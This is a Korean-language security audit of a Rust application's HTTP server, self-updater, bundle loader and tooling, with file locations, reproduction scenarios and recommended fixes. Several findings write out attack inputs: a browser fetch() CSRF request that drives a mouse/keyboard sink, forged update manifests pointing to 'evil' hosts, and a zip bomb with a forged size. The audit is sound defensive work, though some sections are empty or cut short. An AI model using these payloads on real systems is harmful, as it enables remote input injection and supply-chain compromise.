### H2. 인바운드 HTTP 서버에 인증이 전혀 없다 — MouseKeyboard 와 묶이면 원격 입력 주입

**위치**
- `crates/nl-io/src/runner.rs:278-345` — `http_server_loop`. `request.headers()` 를 한 번도 읽지 않는다. 토큰·Origin·Host 검사 없음
- `crates/nl-io/src/runner.rs:1417-1436` — `Sink::MouseKeyboard` 는 `as_i64(v)` 로 인덱스만 뽑아 액션을 고른다
- `crates/nl-io/src/runner.rs:239-251` — 응답에 CORS 헤더 없음(응답은 못 읽지만 요청은 도착한다)
- `crates/nl-io/src/runner.rs:686-700` — 런타임은 번들이 지정한 `bind` 를 그대로 연다
- 대조군(빌더만 있음): `crates/nl-app/src/pcanvas.rs:25` 기본 `127.0.0.1:8787`, `crates/nl-app/src/views/pipeline.rs:390-401` 비루프백 경고

**재현 시나리오 A — 브라우저 CSRF (루프백이어도 성립)**
1. 피해자가 `HttpServer` → `Sink::MouseKeyboard` 파이프라인이 든 앱을 실행 중이다 (`127.0.0.1:8787/infer`).
2. 피해자가 아무 웹페이지나 연다. 그 페이지가 `fetch('http://127.0.0.1:8787/infer', {method:'POST', mode:'no-cors', body:'3'})` 를 호출한다.
3. `Content-Type: text/plain` 인 POST 는 CORS 단순 요청이라 preflight 없이 그대로 도착한다. 응답은 읽지 못하지만 **액션은 실행된다**.
4. `Host` 헤더를 검사하지 않으므로 DNS rebinding 으로도 같은 결과를 얻는다.

**재현 시나리오 B — 네트워크 노출**
번들이 `bind` 를 `0.0.0.0:8787` 로 지정하면 같은 네트워크의 누구나 호출한다. 런타임은 빌더의 루프백 기본값도 경고도 재현하지 않는다.

**권장 수정**
- 공유 비밀 헤더를 필수로 요구한다 (`Source::HttpServer` 에 `token: String` 필드 추가, 불일치 시 401).
- `Origin` 헤더가 존재하면 거부한다 (브라우저에서 온 요청을 차단).
- `Host` 를 bind 주소와 대조해 DNS rebinding 을 막는다.
- 비루프백 bind 는 런타임 시작 시 사용자 확인을 받는다.
- 응답에 `X-Content-Type-Options: nosniff` 를 추가한다.

### H3. 업데이트 서명 검증이 fail-open 이고 빌더 공개키가 `None` 으로 박혀 있다

**위치**

- 이 동작을 테스트가 고정한다: `crates/nl-update/tests/server.rs:276-284`, `crates/nl-update/src/signature.rs:94-96`

**재현 시나리오**
자산 바이너리에 별도 서명이 없으므로 신뢰 뿌리는 "서명된 매니페스트 안의 sha256" 하나뿐이다(`crates/nl-update/src/download.rs:105-109`). 공개키가 없으면 체인 전체가 무인증이 된다.

2. 공격자가 매니페스트 호스트/CDN/S3 버킷을 장악하거나 H4 와 결합해 MITM 한다.
3. 공격자 매니페스트: `{"version":"99.0.0","assets":{"linux-x86_64":{"url":"http://evil/payload","sha256":"<payload 의 실제 해시>","kind":"binary"}}}`.

5. Windows 경로는 `crates/nl-update/src/apply.rs:54-57` 이 공격자 파일을 `/SILENT` 로 실행하므로 UAC 승격을 요구하면 권한 상승까지 간다.

**권장 수정**

### H4. https 를 어디서도 강제하지 않는다 — 평문 전송과 리다이렉트 다운그레이드

**위치**
- `crates/nl-update/src/lib.rs:113-121` — `agent()` 가 타임아웃만 설정, `https_only`/`max_redirects` 미설정
- `crates/nl-update/src/download.rs:58-62` — 자산 요청도 같은 에이전트
- `crates/nl-app/src/tools.rs:370-375` — `ureq::get(url)` 에 스킴 검사 없음
- `crates/nl-io/src/http.rs:41-51` — `agent()` 설정에 `https_only` 없음
- `crates/nl-runtime/src/update.rs:138-145` — `NL_UPDATE_URL` 과 번들 `update_url` 을 스킴 검증 없이 사용
- 저장소 전체에 스킴을 검사하는 코드가 한 줄도 없다 (grep 확인)

**확인한 ureq 3.4.1 기본값** (`ureq-3.4.1/src/config.rs:887,893,894`)
- `https_only: false` → `http://` URL 이 그대로 나간다
- `max_redirects: 10`, `max_redirects_will_error: true`
- 스킴 검사는 `run.rs:149` 의 `call_run` 안에 있고 리다이렉트 홉마다 재진입한다 → `https_only(true)` 를 켜면 https→http 다운그레이드도 자동 차단된다. 켜지 않은 지금은 **허용된다**

**재현 시나리오**
① 빌드 뷰 매니페스트 칸에 `http://…/latest.json` 을 넣는다. ② https 매니페스트가 `"url":"http://…/nl-runtime"` 을 돌려준다. ③ 정상 https URL 이 `302 → http://` 로 리다이렉트된다. 셋 다 평문으로 바이너리를 받는다. H3/H5 와 겹치면 검증 없이 임의 실행 파일이 설치된다. H3 을 고치더라도 MITM 은 옛 매니페스트 재생(H8 리플레이)이나 응답 드롭으로 보안 패치를 영구히 막을 수 있다.

**권장 수정**
```rust
// 에이전트 설정 3곳 모두
ureq::Agent::config_builder()
    .https_only(true)          // 홉마다 검사 → https→http 리다이렉트도 막힌다
    .max_redirects(3)
    .max_redirects_will_error(true)
    .build()

/// URL 을 받는 모든 진입점에서 먼저 부른다.
pub(crate) fn require_https(url: &str) -> anyhow::Result<()> {
    anyhow::ensure!(url.starts_with("https://"), "업데이트 주소는 https 여야 합니다: {url}");
    Ok(())
}
```
`check_signed`(`crates/nl-update/src/lib.rs:139` 직전), `download`(`crates/nl-update/src/download.rs:53`), `crates/nl-runtime/src/update.rs:138`, `crates/nl-app/src/tools.rs` 계획 생성부와 다운로드 직전에 호출한다. 테스트 서버(`crates/nl-update/tests/server.rs:34`)가 평문 http 이므로 `#[cfg(test)]` 우회는 통합 테스트(별도 크레이트)에서 동작하지 않는다 — `Updater` 에 명시적 `allow_plaintext_for_tests` 플래그를 두거나 테스트를 self-signed TLS 로 올린다.

### H5. sha256 이 없으면 검증을 건너뛰는데, 동의 모달은 검증한다고 표시한다

**핵심 판정: 거부하지 않는다. 검증을 건너뛰고 저장한 뒤 실행 권한(0o755)까지 부여한다.**

**코드 흐름**
1. `crates/nl-app/src/tools.rs:167-174` — `Asset.sha256` 이 `#[serde(default)]` 인 `String`. 매니페스트에 키가 없으면 **빈 문자열**(Option 이 아니라 "없음"과 "빈 값"이 구분되지 않는다)
2. `crates/nl-app/src/tools.rs:272` — 빈 문자열이 그대로 `Method::Download` 계획에 들어간다
3. `crates/nl-app/src/tools.rs:403-411` — 실제 분기:
```rust
if !sha256.trim().is_empty() {
    let got = nl_bundle::sha256_hex(&buf);
    if !got.eq_ignore_ascii_case(sha256.trim()) { return Err(...); }
} else {
    let _ = tx.send(ToolEvent::Log("매니페스트에 sha256 이 없어 검증을 건너뜁니다".into()));
}   // ← else 는 로그 한 줄만 남기고 계속 진행
```
4. `crates/nl-app/src/tools.rs:416-417` — `write_atomic(dest, &buf)` → `make_executable(dest)` → `:495-503` 에서 `0o755`

**모달이 사실을 숨긴다**: `crates/nl-app/src/tools.rs:264-268` 의 `steps` 는 sha256 유무와 무관하게 언제나 "내려받은 파일의 sha256 을 매니페스트 값과 맞춰 봅니다."를 넣고 `crates/nl-app/src/app.rs:1609-1618` 이 그대로 그린다.

**재현 시나리오**
공격자가 `NL_RUNTIME_MANIFEST` 환경 변수, 빌드 뷰의 매니페스트 입력칸(`crates/nl-app/src/views/build.rs:589-596`), 또는 기본 매니페스트 호스트를 통제한다. `{"assets":{"linux-x86_64":{"url":"https://evil/x","size":123}}}` 처럼 `sha256` 키를 **그냥 뺀다**. 사용자는 "sha256 을 맞춰 봅니다"라고 적힌 모달을 읽고 승인 → 임의 바이너리가 `~/.local/share/neural-linker/runtimes/<triple>/nl-runtime` 에 0755 로 저장된다. 그 바이너리는 이후 모든 배포 산출물의 바탕이 되므로(`crates/nl-app/src/views/build.rs:124` `nl_bundle::attach`) **빌더 사용자가 만든 앱을 받는 모든 최종 사용자**가 감염된다. 공급망 감염이다.

**권장 수정**
- `Asset.sha256` 을 `Option<String>` 으로 바꾸고, `plan_runtime` 에서 `None`/빈 값이면 계획 생성 자체를 실패시킨다.
- `download()` 에서도 방어적으로 `if sha256.trim().is_empty() { return Err(...) }` (현재 `else` 분기 제거).
- `Plan` 에 `verified: bool`, `makes_executable: bool`, `runs_after: Vec<String>` 을 구조적 필드로 추가하고 모달이 직접 그린다. 검증 없는 계획은 승인 버튼을 기본 비활성화한다.
- `steps` 의 검증 문구는 실제로 검증할 때만 넣는다.

### H7. zip bomb 무방비 — 해제 크기·엔트리 상한 없음 + 공격자 제어 `Vec::with_capacity`

**위치**: `crates/nl-bundle/src/lib.rs:94-96`, `:179-180`
```rust
let mut buf = Vec::with_capacity(f.size() as usize);   // :94
f.read_to_end(&mut buf)?;                              // :95
```

**근거(확인함)**: `f.size()` 는 zip 중앙 디렉터리의 `uncompressed_size` 를 그대로 돌려준다(`zip-6.0.0/src/read.rs:1819-1821`). 온전성 검사가 없다. 이 워크스페이스는 `zip = { version="6", default-features=false, features=["deflate"] }` 라 `Decompressor::new` 의 `uncompressed_size` 인자가 미사용이고(`zip-6.0.0/src/compression.rs:418-419`), deflate 경로는 `flate2::bufread::DeflateDecoder::new(reader)` 하나뿐이라 **출력 길이 제한이 전혀 없다**(`compression.rs:426-428`).

**재현 시나리오**
1. 공격자가 (a) 고압축비 deflate 데이터(10 MB → 10 GB)를 넣거나, (b) 더 싸게 엔트리 내용은 몇 바이트로 두고 중앙 디렉터리의 `uncompressed_size` 만 `0xFFFF_FFFF_FFFF` 로 위조한 200 바이트짜리 zip 을 만든다.
2. 피해자가 `nl-runtime evil.nlapp` 으로 연다 → `crates/nl-runtime/src/main.rs:84` → `Bundle::from_zip`.
3. (b) 는 `Vec::with_capacity(거대값)` 이 `handle_alloc_error` 로 **즉시 프로세스 abort**(catch 불가). (a) 는 OOM / 스왑 스래싱.
4. `read_entry`(`:179`)가 `manifest.json` 을 읽을 때 호출되므로 **첫 엔트리에서** 터진다.

**권장 수정**
- `Vec::with_capacity((f.size()).min(CAP) as usize)` 로 클램프(예: 8 MiB).
- `f.take(remaining_budget).read_to_end(&mut buf)` 로 바꾸고, 읽은 뒤 `buf.len() as u64 == f.size()` 를 확인(아니면 거절). 루프 밖에 `remaining_budget: u64` 를 두어 **번들 전체 누적 해제량**에 상한(예: 2 GB)을 건다.
- `crates/nl-bundle/src/lib.rs:79` 의 `for i in 0..zip.len()` 에 엔트리 개수 상한(예: 10_000)을 둔다.

## 중간

### 실행기 자원 고갈 (nl-io)

**M1. HTTP 수신 큐가 무제한이고 그 안의 요청에는 시간 제한이 없다**
`crates/nl-io/src/runner.rs:258` 의 채널은 unbounded 이고 `:211` 의 `rx` 에 요청이 쌓인다. 504 회수 루프(`:810-825`)는 `pending`(0~1개)만 훑는다. 요청의 `Instant` 는 `pending` 으로 옮겨질 때 비로소 기록되므로(`:1191`), 채널에서 5분을 기다린 요청도 그때부터 10초를 더 받는다. 그 사이 소켓과 최대 8 MB 본문을 무기한 붙잡는다. 클라이언트는 훨씬 전에 타임아웃된다.
*수정*: 채널을 `bounded(N)` 으로 바꿔 가득 차면 즉시 503 을 돌려주고, 수신 시각을 `HttpIncoming` 에 함께 담아 회수 루프가 `rx` 도 훑게 한다.

**M2. tiny_http 0.12 에 연결 수·헤더 상한과 소켓 타임아웃이 없다**
`tiny_http-0.12.0/src/util/task_pool.rs:7-9`, `:68-77` — "A new thread is created every time all the existing threads are full", 상한 없음. `tiny_http-0.12.0/src/client.rs:79-100` 의 `read_next_line` 은 CRLF 가 올 때까지 무제한 `Vec` 을 키운다. 헤더 개수 상한도 없다(`:117-131`). 소스 전체에 `set_read_timeout`/`set_write_timeout` 호출이 **0건**이다. → slowloris(연결당 스레드 하나씩 무한 생성)와 헤더 폭탄(단일 연결로 메모리 고갈).
*수정*: `tiny_http::Server` 앞에 자체 `TcpListener` 를 두고 `Server::from_listener` 를 쓰면서 동시 연결 수를 세어 상한을 걸고, accept 직후 `set_read_timeout` 을 건다. 또는 헤더 파싱을 직접 제어할 수 있는 서버로 교체한다.

**M3. 본문 읽기가 수신 스레드 하나에서 동기로 일어난다**
`crates/nl-io/src/runner.rs:305-327`. `Content-Length: 8MB` 를 선언하고 1초에 1바이트씩 보내는 클라이언트 하나가 그 소스의 수신 루프 전체를 막는다(다른 요청은 accept 되어도 파싱되지 않는다).
*수정*: 소켓에 읽기 타임아웃을 걸고, 전체 요청 처리에 데드라인을 둔다.

**M4. WebSocket·stdin 수신 채널이 무제한인데 소비는 틱당 하나다**
`crates/nl-io/src/runner.rs:725`(WS), `:666`(stdin) 이 `unbounded` 이고 `:1205-1213` / `:1170-1177` 이 틱당 하나만 꺼낸다. 30 Hz 틱이면 초당 30개인데 상대는 수천 개를 보낼 수 있다 → 메모리 단조 증가.

### 업데이트와 도구

**M6. 매니페스트 크기 상한이 압축 바이트에만 걸린다 — gzip 폭탄**
`crates/nl-update/src/lib.rs:37`(1 MiB), `:164-169`. ureq 3.4.1 의 리더 체인은 `MaybeLossyDecoder<CharsetDecoder<ContentDecoder<LimitReader<...>>>>` 이고 **`LimitReader` 가 가장 안쪽**이라(`ureq-3.4.1/src/body/mod.rs:783`, 조립 `:792-841`) 상한이 압축 해제 **전** 바이트에만 적용된다. gzip 은 ureq 기본 기능이며 이 크레이트는 `default-features` 를 끄지 않았다. 1 MB 의 0 바이트 gzip 은 약 1 GB 로 부푼다. **서명 검증 이전 단계라 키가 있어도 막히지 않는다.**
*수정*: `read_to_string` 대신 `.reader().take(MAX+1).read_to_end()` 로 압축 해제 후 바이트를 직접 세고 상한 초과를 `ensure!` 로 거절한다. 부수 효과로 서명 대상이 HTTP 계층 변환에 의존하지 않게 된다(L10 해소).

**M7. 리플레이(freeze / rollback) 방지가 없다**
`crates/nl-update/src/lib.rs:78-85` 의 `newer_for` 는 `version <= current` 만 차단한다. 매니페스트에 만료·에포크 필드가 없고(`:61-69`), `crates/nl-update/src/signature.rs:33` 은 minisign trusted comment 의 timestamp 를 읽지 않는다. 공격자가 정품 서명된 옛 매니페스트를 재생하면 취약한 구버전을 설치시키거나(0.1.0 사용자에게 0.2.0 재생) 최신 사용자의 업데이트를 영구히 멈출 수 있다.
*수정*: 매니페스트에 `issued_at`(RFC3339, 서명 대상 안)을 추가하고 30일 만료를 검사한다. `packaging/make-manifest.sh:19-21` 에 발행 시각을 넣는다. 마지막으로 본 버전을 캐시에 기록해 그보다 낮은 매니페스트를 거부하면 freeze 탐지에 도움이 된다. `signature.rs:33` 의 `allow_legacy = true` 도 `false` 로 좁힌다.

**M8. 매니페스트 호스트와 자산 호스트가 묶여 있지 않다 (핀닝 없음)**
`crates/nl-update/src/lib.rs:83`, `crates/nl-update/src/download.rs:59-62`. `file://` 은 ureq 3 이 지원하지 않아 로컬 파일 읽기는 불가하나 `http://` 는 H4 때문에 가능하다. 자산 URL 이 내부망 주소면 응답 여부·타이밍이 `Event::Failed`(`updater.rs:179`)로 새어 나가 내부 네트워크 프로브가 된다.
*수정*: 매니페스트 URL 과 자산 URL 의 오리진 일치를 검사하거나, 빌드 타임 허용 호스트 목록을 둔다. `crates/nl-core/src/bundle.rs:130` 의 `update_base_url` 접두사와 대조하는 방법도 있다.

**M9. `replace_binary` 의 임시 파일이 예측 가능하고 심볼릭 링크를 따라간다**
`crates/nl-update/src/apply.rs:82-84` — `exe.with_extension("new")`, `fs::copy`(링크를 따라간다), `set_permissions`(링크 타깃에 0755). 실행 파일이 `~/.local/bin/` 처럼 쓰기 가능한 곳에 있으면 공격자가 `app.new` 를 심볼릭 링크로 선점해 임의 파일에 내용을 쓰고 실행 권한을 준다. 이어지는 `rename` 은 링크 자체를 옮기므로 `exe` 가 공격자 경로를 가리키는 링크가 된다. 부수 버그: `with_extension` 은 기존 확장자를 잘라내 `app-0.1.0` → `app-0.1.new` 가 된다.
*수정*: `tempfile::Builder::new().prefix(".nl-update-").tempfile_in(dir)` (O_EXCL, 0600, 같은 파일 시스템) → `sync_all()` → `persist(exe)`. `EXDEV` 문제와 rename 후 길이 0 파일 문제도 함께 해결된다.

**M10. 설치 프로그램을 Authenticode 검증 없이 실행한다**
`crates/nl-update/src/apply.rs:52-58`. **인자 조립 자체는 안전하다** — 인자 3개가 전부 상수 리터럴이고 프로그램 경로는 `Path` 로 넘어가 Rust std 가 따옴표 처리를 한다. 문제는 실행되는 것이 sha256 만 통과한 파일이고 그 sha256 의 출처인 매니페스트 서명이 H3 때문에 꺼져 있을 수 있다는 점, 그리고 실행 직전 재검증이 없다는 점(H11)이다.
*수정*: H11 의 재검증을 Installer 분기에도 적용하고, `WinVerifyTrust(WINTRUST_ACTION_GENERIC_VERIFY_V2)` 로 Authenticode 를 확인한다(`windows-sys` 가 이미 워크스페이스 의존성이다).

**M11. `tools_dir()` 의 `/tmp` 폴백 + PATH 앞에 놓이는 스크립트**
`crates/nl-bundle/src/tools.rs:315-320` — `ProjectDirs::from` 이 `None` 이면(HOME 미설정 등) `/tmp/neural-linker-tools` 가 된다. 그 폴더는 (a) M6/H6 설치본의 저장·실행 경로이고, (b) `ensure_lld_link(&tools_dir().join("bin"))`(`:183`)가 0755 스크립트를 쓰는 곳이며, (c) `run_streaming` 에서 **PATH 맨 앞에 놓인 채**(`:209-214`) 15분짜리 cargo 빌드 동안 수백 번 실행된다. `fs::write` 는 심볼릭 링크를 따라간다.
*수정*: 폴백을 `tempfile::TempDir` 또는 `$XDG_RUNTIME_DIR` 로 바꾸거나 아예 실패시킨다. 디렉터리를 `create_dir` + 0700 으로 배타 생성한다.

**M12. 번들 매니페스트가 자기 업데이트 정책을 스스로 정한다 (신뢰 경계 위반)**
`crates/nl-core/src/bundle.rs:37-46` — `update_url: Option<String>`(스킴 검증 없음), `update_public_key: Option<String>`("없으면 검증을 건너뜁니다"). 신뢰할 수 없는 `.nlapp` 이 `update_url: "http://evil/latest.json"` + `update_public_key: None` 을 선언하면 런타임이 평문 HTTP 매니페스트를 서명 검증 없이 받는다. 사용자에게 보이는 것은 "새 버전이 있습니다" 뿐이다.

**M13. 런타임 작업 폴더가 예측 가능하다**

## 우선순위 상위 5

먼저 배포 런타임의 무조건 무장(**H1**)을 opt-in 으로 바꾸고 킬 스위치를 넣어야 한다. 지금은 `.nlapp` 을 여는 것만으로 임의 키 입력이 가능해 사실상 실행 권한을 넘기는 것과 같고, 필요한 변경은 한 줄과 토글 UI 뿐이다(다른 브랜치에서 이미 수정 중). 둘째로 인바운드 HTTP 서버에 공유 비밀과 Origin·Host 검사를 붙여야 한다(**H2**). 인증이 없으면 피해자가 아무 웹페이지만 열어도 CSRF 로 파이프라인이 호출되고, MouseKeyboard 싱크와 묶이면 첫 번째 문제와 같은 결과가 원격에서 난다. 셋째는 업데이트 공개키를 실제 값으로 박고 `verify_manifest` 에서 `Option` 을 제거해 fail-open 을 타입 수준에서 없애는 것이다(**H3**). 현재 배포된 빌더는 무인증으로 자기 자신을 업데이트하는 상태이며 24시간 안에 처리할 일이다. 넷째로 에이전트 설정에 `https_only(true)` 와 리다이렉트 제한을 거는 것인데(**H4**), 몇 줄이면 끝나고 세 번째 항목과 함께 나가야 효과가 있다. 다섯째는 런타임 다운로드 폴더를 사용자 전용 캐시로 옮기고 `.part` 를 `O_EXCL|O_NOFOLLOW|0600` 으로 열며 적용 직전에 sha256 을 다시 확인하는 것이다(**H11**). 이 셋은 하나의 공격 사슬이라 따로 고치면 구멍이 남는다.

그 다음 단계로 sha256 없는 다운로드 거부와 동의 모달 문구 정정(H5), Inno Setup 해시 고정(H6), zip bomb 상한(H7), 템플릿 이스케이프 분리(H8), 프로젝트 경로 경계 검사(H9)를 한 주 안에 묶어 처리하기를 권한다. 마지막 항목은 `safe_relative` 라는 정답이 이미 저장소 안에 있고 번들 해제 경로가 그것을 제대로 쓰고 있으므로, 같은 함수를 `nl-core` 로 올려 로드 경계에 적용하는 것으로 충분하다. 중간 항목 중에서는 M19(codec 정수 연산)가 `[profile.release]` 에 `overflow-checks = true` 를 켜고 `checked_*` 로 바꾸는 것만으로 한 번에 정리되므로 비용 대비 효과가 크다.
